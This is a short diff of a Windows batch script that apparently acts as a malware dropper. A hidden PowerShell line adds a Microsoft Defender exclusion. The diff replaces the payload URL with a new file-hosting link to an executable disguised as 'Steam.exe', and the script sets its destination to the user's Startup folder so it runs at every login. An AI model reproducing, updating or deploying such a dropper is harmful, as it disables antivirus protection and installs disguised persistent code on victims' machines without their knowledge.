@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://download948.mediafire.com/3sd3hjwit9dgHNJPIMh3EzQ8MhQp_h7K5u9z9R1X2kY51OYu7SL0_0ZUl4ZsKVqCJnOSiS5igirxfW2AmGdoS0liAhk8mCFM3qWq1ouhWudUL9sPdWMOelU4QTe7qUTyfRsFCKowzb1YisUd2UPYuBI5fBaVMLNDAZs0ncNVf0Oc/xork33nz14tsx1d/Steam.exe"
+set "URL=https://server72.dosya.co/cgi-bin/azcl9.cgi/pu5v7tvq42eaoyfqakuaebtdfvbeldj5hqwv6wuxca/Steam.exe"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\app.exe"
 
 
